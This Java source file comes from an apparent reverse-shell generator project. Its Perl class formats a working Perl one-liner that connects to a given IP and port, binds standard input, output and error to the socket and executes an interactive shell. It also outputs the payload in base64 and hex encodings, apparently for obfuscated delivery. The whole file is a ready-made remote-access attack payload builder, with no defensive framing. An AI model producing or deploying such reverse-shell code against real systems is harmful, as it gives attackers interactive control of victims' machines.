package com.iteso.ReverseShellGenerator.Reverse.Shells;
import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.Reverse.Reverse;

public class Perl extends Reverse {

    protected String shellFormat = "";

    public Perl(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("perl -e 'use Socket;$i=\\\"%s\\\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"%s -i\\\");};'",this.getLocalIP(), this.getLocalPort(), this.getShell());
    }

    @Override
    public String getShellCode(){
        return shellFormat;
    }

    @Override
    public String toString(){
        return "{" + "\"parameters\": " + super.toString() + "," +
                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                "}";
    }
    
} 
    